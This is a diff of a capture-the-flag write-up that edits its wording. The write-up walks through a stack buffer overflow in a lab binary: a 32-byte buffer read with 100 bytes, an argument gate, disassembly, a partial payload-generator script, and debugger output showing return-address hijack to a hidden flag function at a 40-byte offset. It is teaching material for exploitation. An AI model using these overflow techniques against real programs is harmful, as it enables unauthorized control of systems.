@@ -4,7 +4,7 @@
 There's a guard that's protecting the flag! How do I sneak past him?
 
 ## Challenge Overview
-The problem provides us with a binary. Try the same operation with others pwn challenge, first try to check the information of the binary:
+The challenge provides a binary. As with other pwn challenges, the first step is to inspect the binary's metadata:
 ```bash
 $ file pwnable
 pwnable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ad855ad92ecf4b31fafab1c64895b7bc268895a5, for GNU/Linux 3.2.0, not stripped
@@ -83,18 +83,18 @@ Trying to decompile the binary with IDA, we can find some special symbols and so
     }
     ```
 
-Take a look at all special symbol, we can have some conclusion:
-- First, the Input Handling Vuln is likely appear in `read_input()`. At the init step of this function, the buffer `char buf` allocates only 32 bytes on stack. However, the system allows to read up to `0x64 = 100 (decimal)` bytes. Since 100 > 32, extra data will "overflow" the boundaries of `buf` and overwrite adjacent memory on the stack.
-- Next, there is no way to get access to the `secret_function()` in `main()`. So we predicted that this can be seen as a hidden winning path.
-- Finally, our input need to pass initial argument gate in `main()` before reaching vulnerable code.
+Examining these symbols leads to a few conclusions:
+- An input-handling vulnerability appears in `read_input()`: the function allocates a 32-byte stack buffer but calls `read` with 0x64 (100) bytes. Because 100 &gt; 32, input can overflow `buf` and overwrite adjacent stack memory.
+- `secret_function()` is not called by `main()`, so it appears to be a hidden path that an exploit could jump to.
+- The attacker must pass an argument gate in `main()` before `read_input()` is invoked.
 
-Since we have found the "overflow" vuln in `read_input()`, a hypothese can be thought that we can send a payload to overwrite RIP to jump to `secret_function()`. Moreover, looking at `secret_function()`, the source code contains a `for` loops with it index return to a char, which can be printed through `stdout`.
+Since the overflow exists in `read_input()`, we hypothesize we can overwrite the saved RIP to redirect execution to `secret_function()`. The `secret_function()` decodes a byte array in a loop and prints each byte via `putchar`, so redirecting control there should reveal the flag.
 
-Before moving to analyze, we have summarize the binary flow like this:
+Before proceeding, here's a concise summary of the binary's control flow:
 1. Check `argc`.
 2. If no extra argument: print “Are you not going to say hello?” and exit.
 3. Else parse `argv[1]` via `atoi`.
-4. Subtract constant `0x656c6c6f (= 1701655903)` (ASCII little-endian of `"hello"`).
+4. Subtract constant `0x656c6c6f` (decimal 1701604463), which corresponds to the ASCII little-endian form of `"hello"`.
 5. If result != 0: print “Hi. Go away.” and exit.
 6. If result == 0: print “Hi. What do you want.” and call `read_input` with that zero value as first argument.
 7. `read_input` reads attacker input and compares to `"givemeflag\n"`.
@@ -102,8 +102,8 @@ Before moving to analyze, we have summarize the binary flow like this:
 9. Else: prints rejection message.
 10. Return path is vulnerable due to stack overflow.
 
-## Binary Analyzing
-First, try to find the address of all symbol of this binary, we find the address of `secret_function()` at `0x40124f`. Moreover, base on the `checksec`, the binary has no PIE, so the target address is fixed.
+## Binary Analysis
+First, find the addresses of the binary's symbols: `secret_function()` is at `0x40124f`. Because the binary is non-PIE, these addresses are fixed.
 ```bash
 $ nm -n pwnable | egrep ' main$| read_input$| secret_function$| _start$'
 0000000000401080 T _start
@@ -155,7 +155,7 @@ Next, try disassembly all symbols of this binary:
         4011ec:       c3                      ret
     ```
 
-    This disassembly source code has some special point:
+    Notable points:
     ```asm
         401175: cmp DWORD PTR [rbp-0x14],0x1
         401179: jne 401191
@@ -169,9 +169,9 @@ Next, try disassembly all symbols of this binary:
     ```
 
     Interpretation:
-    - Gate is purely arithmetic: `atoi(argv[1]) == 0x656c6c6f`.
-    - Decimal equivalent is `1701604463`.
-    - Passing this gate reaches vulnerable function.
+    - The gate is arithmetic: `atoi(argv[1]) == 0x656c6c6f`.
+    - The decimal equivalent is `1701604463`.
+    - Passing this gate reaches the vulnerable `read_input()`.
 
 - `read_input()`:
     ```bash
@@ -206,7 +206,7 @@ Next, try disassembly all symbols of this binary:
         40124e:       c3                      ret
     ```
 
-    Special point:
+    Notable points:
     ```asm
         4011f1: sub rsp,0x30
         4011f5: mov DWORD PTR [rbp-0x24],edi
@@ -221,12 +221,10 @@ Next, try disassembly all symbols of this binary:
         40124e: ret
     ```
 
-    Base on the special point:
-    - Stack buffer at `[rbp-0x20]` is **32 bytes**.
-    - `read` size is **100 bytes**.
-    - This overflows local buffer and overwrites:
-        - saved RBP,
-        - saved RIP.
+    Based on the above:
+    - The stack buffer at `[rbp-0x20]` is **32 bytes**.
+    - `read` is called with size **100 bytes**.
+    - The read can overflow the buffer and overwrite saved RBP and the saved RIP.
 
 - `secret_function()`:
     ```bash
@@ -270,7 +268,7 @@ Next, try disassembly all symbols of this binary:
         4012da:       c3                      ret
     ```
 
-    Special point:
+    Notable points:
     ```asm
         401257: mov BYTE PTR [rbp-0x5],0x32   ; XOR key
         ...
@@ -280,9 +278,9 @@ Next, try disassembly all symbols of this binary:
         4012cf: cmp   eax,DWORD PTR [rbp-0xc] ; loop over 0x27 bytes
     ```
 
-    Base on the special point, this function writes a byte array into stack, XORs each byte with key `0x32`, and prints each decoded byte via `putchar`. Decoded output is the real flag.
+    Based on this, `secret_function()` writes a byte array to the stack, XORs each byte with the key `0x32`, and prints each decoded byte with `putchar`. The decoded output is the real flag.
 
-Next, we try some dynamic analysis. First, generate a `payload.bin` for dynamic analyzing. This payload is designed to overflow the 32-byte buffer you identified earlier and overwrite the function's return address to redirect the program to a specific memory location `0x40124f`:
+Next, we perform dynamic analysis. First, generate a `payload.bin` to overflow the 32-byte buffer and overwrite the return address with `0x40124f`:
 ```python
 import struct
 
@@ -291,7 +289,7 @@ open('payload.bin','wb').write(payload)
 print('len=',len(payload))
 ```
 
-Afyer creating the `payload.bin`, we use pwndbg for dynamic analyzing:
+After creating `payload.bin`, we use gdb/pwndbg for dynamic analysis:
 ```bash
 $ gdb -q ./pwnable                                                                                            
 
@@ -323,7 +321,7 @@ rsp            0x7fffffffd4e8      0x7fffffffd4e8
 rip            0x40124f            0x40124f <secret_function>
 ```
 
-Base on the result, we have some important output:
+From the debugger output, these results are important:
 ```bash
 Breakpoint 1, 0x000000000040124e in read_input ()
 rip 0x40124e <read_input+97>
@@ -333,12 +331,12 @@ rbp 0x4141414141414141 ; --> payload worked
 rip 0x40124f <secret_function> ; --> now executing secret_function.
 ```
 
-This result means:
-- Saved frame pointer is overwritten with `A`s.
-- Single-step over `ret` transfers execution directly into `secret_function`.
-- This is conclusive control-flow hijack evidence.
+This indicates:
+- The saved frame pointer is overwritten by the payload.
+- Single-stepping over the `ret` transfers execution into `secret_function()`.
+- This is conclusive evidence of control-flow hijack.
 
-Base on the analyzing we need to build a construct payload with exact offset 40 bytes to saved RIP, Then set RIP to `secret_function` address `0x40124f`.
+Based on the analysis, we need to build a payload with an exact 40-byte offset to overwrite the saved RIP and set it to `0x40124f` (the address of `secret_function`).
 
 ## Exploit code
 Here is the exploit code:
